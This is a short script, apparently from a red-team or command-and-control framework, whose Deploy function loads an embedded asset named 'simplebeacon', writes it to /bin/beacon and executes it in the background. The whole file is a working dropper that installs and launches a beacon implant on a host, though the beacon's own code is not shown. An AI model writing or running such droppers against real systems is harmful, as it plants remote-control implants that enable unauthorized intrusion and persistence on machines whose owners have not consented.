//priority:99
//timeout:60

//import:simplebeacon

function Deploy() {
    var beacon = GetAssetAsBytes("simplebeacon");
    var path = "/bin/beacon";

    G.file.WriteFileFromBytes(path, beacon[0]);
    G.exec.ExecuteCommandAsync(path, [""]);
}

